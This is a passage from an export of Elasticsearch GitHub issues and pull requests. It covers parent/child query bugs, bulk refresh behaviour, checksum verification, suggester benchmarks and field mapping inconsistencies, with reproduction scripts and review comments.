</description><key id="40779571">7362</key><summary>If _parent field points to a non existing parent type, then skip the has_parent query/filter</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/martijnvg/following{/other_user}', u'events_url': u'https://api.github.com/users/martijnvg/events{/privacy}', u'organizations_url': u'https://api.github.com/users/martijnvg/orgs', u'url': u'https://api.github.com/users/martijnvg', u'gists_url': u'https://api.github.com/users/martijnvg/gists{/gist_id}', u'html_url': u'https://github.com/martijnvg', u'subscriptions_url': u'https://api.github.com/users/martijnvg/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/580421?v=4', u'repos_url': u'https://api.github.com/users/martijnvg/repos', u'received_events_url': u'https://api.github.com/users/martijnvg/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/martijnvg/starred{/owner}{/repo}', u'site_admin': False, u'login': u'martijnvg', u'type': u'User', u'id': 580421, u'followers_url': u'https://api.github.com/users/martijnvg/followers'}</assignee><reporter username="">martijnvg</reporter><labels><label>:Parent/Child</label><label>bug</label><label>v1.3.3</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-21T07:35:36Z</created><updated>2015-06-07T19:04:27Z</updated><resolved>2014-08-27T07:03:09Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="jpountz" created="2014-08-26T08:49:40Z" id="53392016">Given that the extraction of the parent filter gets a bit more complicated, maybe this should be extracted to a utility method to make sure it doesn't get out-of-sync between the query and the filter?
</comment><comment author="martijnvg" created="2014-08-26T09:12:00Z" id="53394298">@jpountz good point, I'll change that.
</comment><comment author="martijnvg" created="2014-08-26T16:40:52Z" id="53450735">@jpountz Updated the pr, and common parsing logic has been moved to a static helper method. 
</comment><comment author="jpountz" created="2014-08-26T16:54:52Z" id="53452719">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Refresh on specific items in bulk request is ignored when using java api</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7361</link><project id="" key="" /><description>The Java api can be a bit misleading (https://github.com/elasticsearch/elasticsearch/blob/ba8df3b5bac0eb1317ad49bb9252c29fefc01294/src/main/java/org/elasticsearch/action/update/UpdateRequest.java#L353).  When setting refresh at the individual item level within a bulk request, the refresh does not actually occur:

``` java
            UpdateRequest updateRequest = new UpdateRequest()
                    .index("index_name")
                    .type("type")
                    .id("12345")
                    .script("ctx._source.something=param;")
                    .addScriptParam("param", "abcd")
                    .refresh(true);
            BulkRequestBuilder bulkRequest =
                    client.prepareBulk();
            bulkRequest.add(updateRequest);
            bulkRequest.execute().actionGet();
```

The refresh does work if you set it at the bulk request level, eg.

``` java
            UpdateRequest updateRequest = new UpdateRequest()
                    .index("index_name")
                    .type("type")
                    .id("12345")
                    .script("ctx._source.something=param;")
                    .addScriptParam("param", "abcde");
            BulkRequestBuilder bulkRequest =
                    client.prepareBulk();
            bulkRequest.add(updateRequest);
            bulkRequest.setRefresh(true).execute().actionGet();
```
</description><key id="40774577">7361</key><summary>Refresh on specific items in bulk request is ignored when using java api</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/dadoonet/following{/other_user}', u'events_url': u'https://api.github.com/users/dadoonet/events{/privacy}', u'organizations_url': u'https://api.github.com/users/dadoonet/orgs', u'url': u'https://api.github.com/users/dadoonet', u'gists_url': u'https://api.github.com/users/dadoonet/gists{/gist_id}', u'html_url': u'https://github.com/dadoonet', u'subscriptions_url': u'https://api.github.com/users/dadoonet/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/274222?v=4', u'repos_url': u'https://api.github.com/users/dadoonet/repos', u'received_events_url': u'https://api.github.com/users/dadoonet/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/dadoonet/starred{/owner}{/repo}', u'site_admin': False, u'login': u'dadoonet', u'type': u'User', u'id': 274222, u'followers_url': u'https://api.github.com/users/dadoonet/followers'}</assignee><reporter username="">ppf2</reporter><labels><label>:Java API</label><label>discuss</label></labels><created>2014-08-21T05:48:08Z</created><updated>2015-12-01T11:46:35Z</updated><resolved>2015-12-01T11:46:35Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-11-07T09:51:05Z" id="62120444">Refresh at the item level is currently not supported.  We could do so, but have to be sure that the refresh only happens once per shard, after the mini-bulk has completed, rather than on every item.
</comment><comment author="clintongormley" created="2015-11-21T17:19:27Z" id="158663091">The REST bulk API rejects use of `refresh` at the item level.  Not sure if we can easily implement the same in the Java API.

@dadoonet could you take a look please?
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Verify checksums on merge</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7360</link><project id="" key="" /><description>This just exposes the current lucene option `checkIntegrityAtMerge` from LiveIndexWriterConfig. When enabled, all parts of the index are verified before merging.
</description><key id="40770286">7360</key><summary>Verify checksums on merge</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/rmuir/following{/other_user}', u'events_url': u'https://api.github.com/users/rmuir/events{/privacy}', u'organizations_url': u'https://api.github.com/users/rmuir/orgs', u'url': u'https://api.github.com/users/rmuir', u'gists_url': u'https://api.github.com/users/rmuir/gists{/gist_id}', u'html_url': u'https://github.com/rmuir', u'subscriptions_url': u'https://api.github.com/users/rmuir/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/504194?v=4', u'repos_url': u'https://api.github.com/users/rmuir/repos', u'received_events_url': u'https://api.github.com/users/rmuir/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/rmuir/starred{/owner}{/repo}', u'site_admin': False, u'login': u'rmuir', u'type': u'User', u'id': 504194, u'followers_url': u'https://api.github.com/users/rmuir/followers'}</assignee><reporter username="">rmuir</reporter><labels><label>:Core</label><label>enhancement</label><label>release highlight</label><label>resiliency</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-21T03:51:27Z</created><updated>2015-06-07T12:13:19Z</updated><resolved>2014-09-02T16:19:02Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="rjernst" created="2014-08-21T04:02:30Z" id="52876216">This looks good.  Just a minor comment on the docs.
</comment><comment author="rmuir" created="2014-09-02T14:50:42Z" id="54163065">I updated this with a test extending simon's new base class, changing default to true.
</comment><comment author="rjernst" created="2014-09-02T15:01:35Z" id="54164831">LGTM
</comment><comment author="s1monw" created="2014-09-02T15:17:04Z" id="54167246">can you change the name of the issue to reflect the fact that we enable this feature rather than adding an option. Other than that LGTM thanks rob
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Index API docs: incomplete refresh description</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7359</link><project id="" key="" /><description>It seems that refresh parameter can cause refresh of relevant shard only (as for get and delete operations). But documentation doesn't contain this information. 
</description><key id="40750792">7359</key><summary>Index API docs: incomplete refresh description</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/clintongormley/following{/other_user}', u'events_url': u'https://api.github.com/users/clintongormley/events{/privacy}', u'organizations_url': u'https://api.github.com/users/clintongormley/orgs', u'url': u'https://api.github.com/users/clintongormley', u'gists_url': u'https://api.github.com/users/clintongormley/gists{/gist_id}', u'html_url': u'https://github.com/clintongormley', u'subscriptions_url': u'https://api.github.com/users/clintongormley/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/56599?v=4', u'repos_url': u'https://api.github.com/users/clintongormley/repos', u'received_events_url': u'https://api.github.com/users/clintongormley/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/clintongormley/starred{/owner}{/repo}', u'site_admin': False, u'login': u'clintongormley', u'type': u'User', u'id': 56599, u'followers_url': u'https://api.github.com/users/clintongormley/followers'}</assignee><reporter username="">YuliaTsareva</reporter><labels><label>docs</label></labels><created>2014-08-20T22:08:46Z</created><updated>2014-09-07T09:37:25Z</updated><resolved>2014-09-07T09:37:25Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-08-22T13:39:17Z" id="53061128">Yes, you are correct. Would you like to send a PR to fix the docs?

thanks
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>NPE in ShardStats when routing entry is not set yet on IndexShard</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7358</link><project id="" key="" /><description>closes #7356
</description><key id="40736917">7358</key><summary>NPE in ShardStats when routing entry is not set yet on IndexShard</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">kimchy</reporter><labels><label>:Stats</label><label>bug</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-20T19:43:53Z</created><updated>2015-06-07T19:04:41Z</updated><resolved>2014-08-20T21:39:02Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-08-20T19:44:58Z" id="52833146">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>The has_parent request is broken for self-referential parent types</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7357</link><project id="" key="" /><description>We don't explicitly prohibit types from referring to themselves as parents. This functionality worked fine before 0.90 release, but since 0.90 it seems to be broken for the `has_parent` query. In the following script, both search requests return results in 0.20.x but only the second search request returns results in 0.90.x and above.

```
curl -XDELETE localhost:9200/test-idx
curl -XPUT localhost:9200/test-idx -d '{
    "settings": {
        "index.number_of_shards": 1,
        "index.number_of_replicas": 0
    },
    "mappings": {
        "doc": {
            "_parent": {
                "type": "doc"
            }
        }
    }
}'
curl -XPUT "localhost:9200/test-idx/doc/1?routing=1&amp;pretty" -d '{"name": "doc_1"}'
curl -XPUT "localhost:9200/test-idx/doc/2?parent=1&amp;pretty" -d '{"name": "doc_2"}'
curl -XPOST "localhost:9200/test-idx/_refresh?pretty"
echo
curl "localhost:9200/test-idx/doc/_search?pretty" -d '{
    "query": {
        "has_parent": {
            "type": "doc",
            "query" : {
                "match_all": {
                }
            }
        }
    }
}'
echo
curl "localhost:9200/test-idx/doc/_search?pretty" -d '{
    "query": {
        "has_child": {
            "type": "doc",
            "query" : {
                "match_all": {
                }
            }
        }
    }
}'
```

search result in 0.20.6:

```
{
  "took" : 54,
  "timed_out" : false,
  "_shards" : {
    "total" : 1,
    "successful" : 1,
    "failed" : 0
  },
  "hits" : {
    "total" : 1,
    "max_score" : 1.0,
    "hits" : [ {
      "_index" : "test-idx",
      "_type" : "doc",
      "_id" : "2",
      "_score" : 1.0, "_source" : {"name": "doc_2"}
    } ]
  }
}
{
  "took" : 2,
  "timed_out" : false,
  "_shards" : {
    "total" : 1,
    "successful" : 1,
    "failed" : 0
  },
  "hits" : {
    "total" : 1,
    "max_score" : 1.0,
    "hits" : [ {
      "_index" : "test-idx",
      "_type" : "doc",
      "_id" : "1",
      "_score" : 1.0, "_source" : {"name": "doc_1"}
    } ]
  }
}
```

search result in the current master:

```
{
  "took" : 66,
  "timed_out" : false,
  "_shards" : {
    "total" : 1,
    "successful" : 1,
    "failed" : 0
  },
  "hits" : {
    "total" : 0,
    "max_score" : null,
    "hits" : [ ]
  }
}

{
  "took" : 16,
  "timed_out" : false,
  "_shards" : {
    "total" : 1,
    "successful" : 1,
    "failed" : 0
  },
  "hits" : {
    "total" : 1,
    "max_score" : 1.0,
    "hits" : [ {
      "_index" : "test-idx",
      "_type" : "doc",
      "_id" : "1",
      "_score" : 1.0,
      "_source":{"name": "doc_1"}
    } ]
  }
}
```
</description><key id="40732496">7357</key><summary>The has_parent request is broken for self-referential parent types</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/martijnvg/following{/other_user}', u'events_url': u'https://api.github.com/users/martijnvg/events{/privacy}', u'organizations_url': u'https://api.github.com/users/martijnvg/orgs', u'url': u'https://api.github.com/users/martijnvg', u'gists_url': u'https://api.github.com/users/martijnvg/gists{/gist_id}', u'html_url': u'https://github.com/martijnvg', u'subscriptions_url': u'https://api.github.com/users/martijnvg/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/580421?v=4', u'repos_url': u'https://api.github.com/users/martijnvg/repos', u'received_events_url': u'https://api.github.com/users/martijnvg/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/martijnvg/starred{/owner}{/repo}', u'site_admin': False, u'login': u'martijnvg', u'type': u'User', u'id': 580421, u'followers_url': u'https://api.github.com/users/martijnvg/followers'}</assignee><reporter username="">imotov</reporter><labels><label>:Parent/Child</label><label>bug</label></labels><created>2014-08-20T18:56:40Z</created><updated>2015-05-30T08:41:23Z</updated><resolved>2015-05-30T08:40:46Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="pbhuyanieee" created="2014-08-28T17:35:39Z" id="53762448">This came up during the training session in Boston. We have use case which could use this feature.
</comment><comment author="martijnvg" created="2015-05-30T08:40:46Z" id="107010411">Closing in favor for #11432
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Stats: Prevent NullPointerException in ShardStats</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7356</link><project id="" key="" /><description>NPE stacktrace from ShardStats class, after executing a Node Stats API:

![image](https://cloud.githubusercontent.com/assets/1224228/3986214/2eac2788-2899-11e4-9ce8-126bf0c59238.png)

(Source: https://twitter.com/bobpoekert/status/502132888066727936)
</description><key id="40730369">7356</key><summary>Stats: Prevent NullPointerException in ShardStats</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">polyfractal</reporter><labels><label>bug</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-20T18:40:26Z</created><updated>2014-08-26T07:12:43Z</updated><resolved>2014-08-20T19:49:50Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments /><attachments /><subtasks /><customfields /></item><item><title>Add hit and miss count to Query Cache</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7355</link><project id="" key="" /><description /><key id="40725092">7355</key><summary>Add hit and miss count to Query Cache</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">kimchy</reporter><labels><label>:Cache</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-20T17:53:25Z</created><updated>2015-06-07T12:13:36Z</updated><resolved>2014-08-20T21:40:14Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="jpountz" created="2014-08-20T21:18:15Z" id="52845732">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Expose ControlledRealTimeReopenThread</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7354</link><project id="" key="" /><description>Have a use case where users can upload documents from a site and the site will refresh the UI immediately to show the new documents, often faster than the default refresh interval of 1s.  Currently there are a few options:
- Decrease the refresh interval to &lt; 1s (not recommended given that refresh is expensive and can affect indexing performance if set too low)
- Make an explicit/immediate refresh call after the upload action
- Delay the update of the view in the UI to allow the new docs to be refreshed in the index.

@mikemccand noted that there is something called ControlledRealTimeReopenThread in Lucene that handles exactly this use case (but not currently exposed in ES), where most search requests don't have to see the latest change but then one specific search request does.
</description><key id="40722154">7354</key><summary>Expose ControlledRealTimeReopenThread</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">ppf2</reporter><labels><label>enhancement</label></labels><created>2014-08-20T17:21:48Z</created><updated>2015-01-03T13:17:46Z</updated><resolved>2014-08-22T13:22:02Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="mikemccand" created="2014-08-20T17:47:14Z" id="52814558">Yeah ControlledRTReopenThread was designed for exactly this situation; it's basically the same as your 3rd option (Delay the update of the view in the UI...): it delays the rare requests that must see the latest changes while allowing the normal (hopefully vast majority) of requests to just use the last refreshed reader.
</comment><comment author="clintongormley" created="2014-08-22T13:22:02Z" id="53059164">This would seem to be a duplicate of #1063 

@mikemccand i've added your comments about ControlledRTReopenThread to that issue
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>NRTSuggester: Support near real-time deleted document filtering for suggestions</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7353</link><project id="" key="" /><description>**NOTE:** This is a PR against `feature/nrt_suggester` and not the `master`!

**Idea:**
- encode lucene docids to corresponding FST outputs
- make sure no surface form is lost even though there may be exact duplicates
- use encoded docids to perform near real-time deleted doc filtering

**Implementation &amp; Considerations:**
- Currently the FST BytesRef Output is in the format:
   `surface_form` + `PAYLOAD_SEP` + `payload` + `PAYLOAD_SEP` + `docID`
- Duplicate surface forms are stored uniquely with dedup bytes. (uses the `END_BYTE` before the dedup bytes, maybe we can support `exact_first` in the future)
- `maxAnalyzedPathsForOneInput` is now dynamically set by taking into account the # of surfaces per analyzed form at build time (to deepen the `TopNSearcher` queue for deduplication of same output form)
- `TopNSearcher` queue size is dynamically changed using a heuristic based on the cardinality of deleted docs
- Minor refactoring
- Adds Suggester benchmarks

**Benchmarks:**

```
-- Build time
  AnalyzingSuggester input: 3472, time[ms]: 255 [+- 9.08]
  XAnalyzingSuggester input: 3472, time[ms]: 412 [+- 11.78]
  XNRTSuggester   input: 3472, time[ms]: 405 [+- 9.85]

-- RAM consumption
  AnalyzingSuggester size[B]:      807,840
  XAnalyzingSuggester size[B]:      758,480
  XNRTSuggester   size[B]:      770,448

-- Lookup performance (prefixes: 100-200, num: 7)
  AnalyzingSuggester queries: 3472, time[ms]: 125 [+- 3.41], ~kQPS: 28
  XAnalyzingSuggester queries: 3472, time[ms]: 165 [+- 5.77], ~kQPS: 21
  XNRTSuggester   queries: 3472, time[ms]: 170 [+- 3.50], ~kQPS: 20

-- Lookup performance (prefixes: 6-9, num: 7)
  AnalyzingSuggester queries: 3472, time[ms]: 109 [+- 3.93], ~kQPS: 32
  XAnalyzingSuggester queries: 3472, time[ms]: 94 [+- 4.75], ~kQPS: 37
  XNRTSuggester   queries: 3472, time[ms]: 107 [+- 5.55], ~kQPS: 32

-- Lookup performance (prefixes: 2-4, num: 7)
  AnalyzingSuggester queries: 3472, time[ms]: 178 [+- 6.05], ~kQPS: 20
  XAnalyzingSuggester queries: 3472, time[ms]: 151 [+- 4.59], ~kQPS: 23
  XNRTSuggester   queries: 3472, time[ms]: 173 [+- 7.49], ~kQPS: 20

-- NRT Lookup performance with deleted doc filtering
  -- prefixes: 100-200, num: 7
   [ 0% deleted docs] XNRTSuggester   queries: 3472, time[ms]: 165 [+- 7.11], ~kQPS: 21
   [20% deleted docs] XNRTSuggester   queries: 3472, time[ms]: 165 [+- 5.80], ~kQPS: 21
   [40% deleted docs] XNRTSuggester   queries: 3472, time[ms]: 166 [+- 7.01], ~kQPS: 21
   [60% deleted docs] XNRTSuggester   queries: 3472, time[ms]: 167 [+- 5.39], ~kQPS: 21
   [80% deleted docs] XNRTSuggester   queries: 3472, time[ms]: 167 [+- 5.59], ~kQPS: 21
  -- prefixes: 6-9, num: 7
   [ 0% deleted docs] XNRTSuggester   queries: 3472, time[ms]: 105 [+- 3.79], ~kQPS: 33
   [20% deleted docs] XNRTSuggester   queries: 3472, time[ms]: 114 [+- 5.90], ~kQPS: 31
   [40% deleted docs] XNRTSuggester   queries: 3472, time[ms]: 135 [+- 14.80], ~kQPS: 26
   [60% deleted docs] XNRTSuggester   queries: 3472, time[ms]: 137 [+- 4.74], ~kQPS: 25
   [80% deleted docs] XNRTSuggester   queries: 3472, time[ms]: 166 [+- 5.32], ~kQPS: 21
  -- prefixes: 2-4, num: 7
   [ 0% deleted docs] XNRTSuggester   queries: 3472, time[ms]: 170 [+- 4.01], ~kQPS: 20
   [20% deleted docs] XNRTSuggester   queries: 3472, time[ms]: 192 [+- 5.98], ~kQPS: 18
   [40% deleted docs] XNRTSuggester   queries: 3472, time[ms]: 219 [+- 6.19], ~kQPS: 16
   [60% deleted docs] XNRTSuggester   queries: 3472, time[ms]: 296 [+- 12.09], ~kQPS: 12
   [80% deleted docs] XNRTSuggester   queries: 3472, time[ms]: 559 [+- 11.32], ~kQPS: 6
```

closes #7133
</description><key id="40711264">7353</key><summary>NRTSuggester: Support near real-time deleted document filtering for suggestions</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/areek/following{/other_user}', u'events_url': u'https://api.github.com/users/areek/events{/privacy}', u'organizations_url': u'https://api.github.com/users/areek/orgs', u'url': u'https://api.github.com/users/areek', u'gists_url': u'https://api.github.com/users/areek/gists{/gist_id}', u'html_url': u'https://github.com/areek', u'subscriptions_url': u'https://api.github.com/users/areek/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/753679?v=4', u'repos_url': u'https://api.github.com/users/areek/repos', u'received_events_url': u'https://api.github.com/users/areek/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/areek/starred{/owner}{/repo}', u'site_admin': False, u'login': u'areek', u'type': u'User', u'id': 753679, u'followers_url': u'https://api.github.com/users/areek/followers'}</assignee><reporter username="">areek</reporter><labels /><created>2014-08-20T15:35:03Z</created><updated>2014-10-21T21:41:06Z</updated><resolved>2014-09-05T22:17:37Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="mikemccand" created="2014-08-21T22:57:41Z" id="52996424">The new benchmark LGTM; would be nice to also allow using titles from LineFileDocs in Lucene's suggester bench too.
</comment><comment author="areek" created="2014-08-25T18:00:03Z" id="53301563">Thanks for the benchmark review, Mike. I will add support for titles from LineFileDocs in Lucene's bench too.
</comment><comment author="s1monw" created="2014-09-05T09:45:43Z" id="54604944">I like the way where we going here. Yet, I think we should move to a new interface here entirely and don't try to refactor lookup.java. This does not need to be in this PR but in general I'd love us to somehow also match the codec APIs for writing etc. rather having this single bogus build methods etc. But what we have here is awesome!
</comment><comment author="areek" created="2014-09-05T15:52:18Z" id="54643500">Thanks @s1monw for the review!

I totally agree moving to a new interface would be the right thing to do here. I have already started the transition away from `Lookup` (coming soon in the next pr). I am extending the `Lookup` interface for now, but as more features are added, I hope to have a clear idea of what the new interface will look like.

I also think this should be committed to the public branch soon, I already have patches on top of this to add support to some of the features mentioned in the `XNRTSuggester` TODO section and would like to start the review process on those :).
</comment><comment author="s1monw" created="2014-09-05T19:24:44Z" id="54669879">I fully agree - LGTM ;) feel free to push
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Supported options on FieldMappers are inconsistent</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7352</link><project id="" key="" /><description>There are inconsistencies in which options are supported in the different field types.  For example, the geo_shape type does not support the 'common' options such as `store`, `index`, `index_name` etc.

There are other inconsistencies in the root types which @brwe has found (specifically regarding the _all field).  We need to go through each type and determine:
- The options which are not supported but should be (and add them)
- The options which are not supported and should not be supported (and document them)
- the options which are supported which shouldn't be - because they don't make any sense (and remove them and document)
</description><key id="40707901">7352</key><summary>Supported options on FieldMappers are inconsistent</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">colings86</reporter><labels><label>breaking</label><label>bug</label></labels><created>2014-08-20T15:05:30Z</created><updated>2015-08-16T10:45:35Z</updated><resolved>2015-08-16T10:45:35Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="brwe" created="2014-08-20T15:33:25Z" id="52795718">About `_all`:

I think `_all` should allow all options that fields of type `string` currently support (except for include_in_all and analyzed/tokenized). For example "search_quote_analyzer" is only supported by `string` fields, `_all` cannot be a multi field, .... Also, due to the different implementations `_all` will for example  accept the following mapping:

```
{
  "mappings": {
    "doc": {
      "_all": {
        "analyzer": "standard",
        "fielddata": {
          "format": "doc_values"
        }
      }
    }
  }
}
```

which should actually result in `MapperParsingException[Field [text] cannot be analyzed and have doc values]`
</comment><comment author="clintongormley" created="2015-08-16T10:45:35Z" id="131523337">The meta-fields have been locked down so that the configuration they expose is minimal.  Closing
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Improve recovery / snapshot restoring file identity handling</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7351</link><project id="" key="" /><description>This commit changes the way how files are selected for retransmission
on recovery / restore. Today this happens on a per-file basis where the
rather weak checksum and the file length in bytes is compared to check if
a file is identical. This is prone to fail in the case of a checksum collision
which can happen under certain circumstances.
The changes in this commit move the identity comparison to a per-commit / per-segment
level where files are only treated as identical iff all the other files in the
commit / segment are the same. This `all or nothing` strategy is reducing the chance for
a collision dramatically since we also use a strong hash to identify commits / segments
based on the content of the `.si` / `segments.N` file.
</description><key id="40704955">7351</key><summary>Improve recovery / snapshot restoring file identity handling</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">s1monw</reporter><labels><label>:Snapshot/Restore</label><label>bug</label><label>resiliency</label><label>v1.3.3</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-20T14:38:48Z</created><updated>2015-06-07T19:05:00Z</updated><resolved>2014-08-21T16:20:20Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-08-20T14:46:28Z" id="52788372">@imotov @rmuir can you guys do a review here? I am not sure about the XContent changes in Backup/Restore would be good to get some ideas here...
</comment><comment author="rmuir" created="2014-08-20T15:15:30Z" id="52792893">The diffing logic here etc looks great to me.
</comment><comment author="imotov" created="2014-08-20T17:34:09Z" id="52812721">I left a couple of minor comments. Otherwise, looks good to me.
</comment><comment author="s1monw" created="2014-08-21T07:47:54Z" id="52888706">@imotov I pushed a new commit including a test for the `FileInfo` serialization
</comment><comment author="imotov" created="2014-08-21T14:58:17Z" id="52932000">LGTM
</comment><comment author="s1monw" created="2014-08-21T15:25:19Z" id="52935942">I think we have a small regression here for snapshot and restore since we don't have the hash for the segments in the already existing snapshot. I think we can read the hashes for those where we calculated them from the snapshot on the fly if necessary. I will open a followup for this as I already discussed this with @imotov 
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>top_hits, date_histogram : allow not serializing some of the fields.</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7350</link><project id="" key="" /><description>Hi.

I would like not to get some of the fields from the response of an API request, since it's killing my CPU time at deserialization of the JSON in the client, I commented the fields that I don't want to receive, Is it possible? 

First aggregation is date_histogram, inner aggregation is top_hits, What i've tried to do is to take the last value from every 30 minutes within a date range.

```
{
   "took" : 21,
   "timed_out" : false,
   "_shards" : {
     "total" : 5,
     "successful" : 5,
     "failed" : 0
   },
   "hits" : {
     "total" : 1715,
     "max_score" : 0.0,
     "hits" : [ ]
   },
   "aggregations" : {
     "my_agg" : {
       "buckets" : [ {
         //"key_as_string" : "2014-08-20T12:00:00.000Z",
         "key" : 1408536000000,
         //"doc_count" : 64,
         "found_hits" : {
           "hits" : {
             // "total" : 64,
             // "max_score" : null,
             "hits" : [ {
               //"_index" : "feed_history",
               // "_type" : "feed_history",
               // "_id" : "de1ea495-13d1-422d-ad44-a96fb0c36af8",
               // "_score" : null,
               "_source":{"value":1.30655,"relatedId":2,"serverTime":"2014-08-20T12:29:59.4410307Z"},
               // "sort" : [ 1408537799441 ]
             } ]
           }
         }
       }, ... ]
     }
   }
 }
```
</description><key id="40696630">7350</key><summary>top_hits, date_histogram : allow not serializing some of the fields.</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">shanielh</reporter><labels /><created>2014-08-20T13:13:09Z</created><updated>2014-08-22T10:58:35Z</updated><resolved>2014-08-20T17:52:29Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-08-20T13:27:57Z" id="52777410">The `key_as_string` will no longer be shown by default, thanks to https://github.com/elasticsearch/elasticsearch/pull/6830

Discussion is happening about removing the metadata. See https://github.com/elasticsearch/elasticsearch/issues/2149
</comment><comment author="shanielh" created="2014-08-20T17:52:29Z" id="52815306">Thanks. Closing due to duplication.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>[ES 1.3.2] NullPointerException while parsing hasParent query/filter</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7349</link><project id="" key="" /><description>Hi, 
I met a strange problem with the latest version of Elasticsearch (1.3.2) - strage as always when NPE occurs :-)
Noticed that Elasticsearch 0.90 did not have such an issue.

Having single incorrect type which references to inexisting parent results in NPE while executing hasParent query/filter on another - correct - type.

To reproduce the issue please refer to description below.

Create index:

```
POST /test
```

Correct mapping:

```
PUT /test/children/_mapping
{
